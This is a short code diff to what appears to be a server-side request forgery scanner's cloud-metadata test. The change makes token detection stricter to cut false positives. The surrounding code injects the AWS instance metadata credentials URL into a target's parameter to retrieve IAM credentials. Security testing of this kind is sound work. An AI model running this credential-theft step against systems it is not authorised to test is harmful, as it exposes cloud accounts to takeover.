@@ -98,8 +98,12 @@ async def test_cloud_metadata_impl(
         tok_resp = await client.post("/api/session/request", json=tok_req)
         token = ""
         if "error" not in tok_resp:
-            m = _re.search(r"[A-Za-z0-9_\-=]{40,}", tok_resp.get("response_body", ""))
-            token = m.group(0) if m else ""
+            # A real IMDSv2 token response IS the token (short body, ~56 chars),
+            # not a token buried in a big reflected page — require the whole
+            # (trimmed) body to BE a token-shaped string to avoid false positives.
+            tb = (tok_resp.get("response_body") or "").strip()
+            token = tb if (40 <= len(tb) <= 120
+                           and _re.fullmatch(r"[A-Za-z0-9_\-=]+", tb)) else ""
         if token:
             creds_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
             cr_path = (f"{path}?{parameter}={creds_url}" if injection_point == "query" else path)
